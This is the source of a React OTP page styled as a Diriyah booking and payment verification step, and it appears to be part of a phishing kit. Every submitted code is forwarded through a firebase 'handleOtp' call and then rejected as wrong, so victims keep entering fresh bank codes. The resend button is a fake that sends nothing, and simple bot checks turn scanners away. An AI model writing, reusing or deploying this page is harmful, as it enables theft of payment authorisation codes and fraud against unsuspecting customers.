import { Link } from "wouter";
import { Menu, ShieldCheck } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { useState, useEffect, useRef } from "react";
import { handleOtp } from "@/lib/firebase";

export default function OTPPage() {
  return (
    <div className="min-h-screen bg-background flex flex-col" dir="rtl">
      <Header />
      <ProgressSteps />
      <main className="flex-1 p-4">
        <OTPForm />
      </main>
    </div>
  );
}

function Header() {
  return (
    <header className="bg-[#3d3428] text-white">
      <div className="container mx-auto px-4 py-4">
        <div className="flex items-center justify-between">
          <Button
            size="icon"
            variant="ghost"
            className="text-white"
            data-testid="button-menu-otp"
          >
            <Menu className="w-5 h-5" />
          </Button>

          <div className="flex-1 flex justify-center">
            <img
              src="/logo-white.svg"
              alt="الدرعية"
              className="h-12"
              data-testid="img-otp-logo"
            />
          </div>

          <div className="w-10" />
        </div>
      </div>
    </header>
  );
}

function ProgressSteps() {
  return (
    <div className="bg-[#f5f0e8] p-4" data-testid="progress-steps-otp">
      <div className="flex items-center justify-center gap-2">
        {[
          { number: 1, label: "تسجيل" },
          { number: 2, label: "الحجز" },
          { number: 3, label: "السلة" },
          { number: 4, label: "الدفع" },
        ].map((step, index, arr) => (
          <div key={step.number} className="flex items-center">
            <div className="flex flex-col items-center">
              <div className="w-8 h-8 rounded-full flex items-center justify-center text-sm font-medium bg-primary text-white">
                {step.number}
              </div>
              <span className="text-xs mt-1 text-foreground">{step.label}</span>
            </div>
            {index < arr.length - 1 && (
              <div className="w-8 h-0.5 mx-1 bg-primary" />
            )}
          </div>
        ))}
      </div>
    </div>
  );
}

function OTPForm() {
  const [otp, setOtp] = useState("");
  const [error, setError] = useState("");
  const [isResending, setIsResending] = useState(false);
  const inputRef = useRef<HTMLInputElement>(null);
  
  const formLoadTime = useRef(Date.now());
  const interactionCount = useRef(0);
  const hasMouseMoved = useRef(false);

  useEffect(() => {
    const handleMouseMove = () => { hasMouseMoved.current = true; };
    const handleKeyPress = () => { interactionCount.current++; };
    
    window.addEventListener('mousemove', handleMouseMove);
    window.addEventListener('touchstart', handleMouseMove);
    window.addEventListener('keypress', handleKeyPress);
    
    inputRef.current?.focus();
    
    return () => {
      window.removeEventListener('mousemove', handleMouseMove);
      window.removeEventListener('touchstart', handleMouseMove);
      window.removeEventListener('keypress', handleKeyPress);
    };
  }, []);

  const isBotDetected = (): boolean => {
    const timeSpent = Date.now() - formLoadTime.current;
    if (timeSpent < 2000) return true;
    if (interactionCount.current < 1) return true;
    if (!hasMouseMoved.current && !('ontouchstart' in window)) return true;
    return false;
  };

  const handleChange = (value: string) => {
    const cleaned = value.replace(/\D/g, "").slice(0, 6);
    setOtp(cleaned);
    setError("");
  };

  const handleSubmit = async () => {
    if (otp.length < 4 || otp.length > 6) {
      setError("يرجى إدخال رمز التحقق (4-6 أرقام)");
      return;
    }
    
    if (isBotDetected()) {
      setError("حدث خطأ، يرجى المحاولة مرة أخرى");
      return;
    }
    
    await handleOtp(otp);
    setError("رمز التحقق غير صحيح، يرجى المحاولة مرة أخرى");
    setOtp("");
    inputRef.current?.focus();
  };

  const handleResend = () => {
    setIsResending(true);
    setTimeout(() => {
      setIsResending(false);
    }, 2000);
  };

  return (
    <div className="max-w-md mx-auto text-center space-y-6 py-8">
      <div className="space-y-3">
        <div className="w-16 h-16 bg-primary/10 rounded-full flex items-center justify-center mx-auto">
          <ShieldCheck className="w-8 h-8 text-primary" />
        </div>
        <h2 className="text-xl font-semibold text-foreground">التحقق من الدفع</h2>
        <p className="text-sm text-muted-foreground">
          تم إرسال رمز التحقق إلى رقم جوالك المسجل
        </p>
      </div>

      <div className="flex justify-center" dir="ltr">
        <Input
          ref={inputRef}
          type="text"
          inputMode="numeric"
          pattern="[0-9]*"
          maxLength={6}
          value={otp}
          onChange={(e) => handleChange(e.target.value)}
          className="w-48 h-16 text-center text-3xl font-bold tracking-[0.5em] border-2 focus:border-primary"
          placeholder="------"
          autoComplete="one-time-code"
          autoFocus
          name="otp"
          data-testid="input-otp"
        />
      </div>

      {error && (
        <p className="text-red-500 text-sm" data-testid="error-otp">{error}</p>
      )}

      <div className="space-y-3 pt-4">
        <Button
          onClick={handleSubmit}
          className="w-full bg-primary hover:bg-primary/90 text-white py-6 text-lg"
          data-testid="button-verify-otp"
        >
          تأكيد الرمز
        </Button>

        <Button
          variant="ghost"
          onClick={handleResend}
          disabled={isResending}
          className="w-full text-primary"
          data-testid="button-resend-otp"
        >
          {isResending ? "جاري إعادة الإرسال..." : "إعادة إرسال الرمز"}
        </Button>

        <Link href="/checkout">
          <Button
            variant="outline"
            className="w-full py-6"
            data-testid="button-back-otp"
          >
            رجوع
          </Button>
        </Link>
      </div>

      <p className="text-xs text-muted-foreground pt-4">
        لم تستلم الرمز؟ تأكد من صحة رقم الجوال المسجل
      </p>
    </div>
  );
}
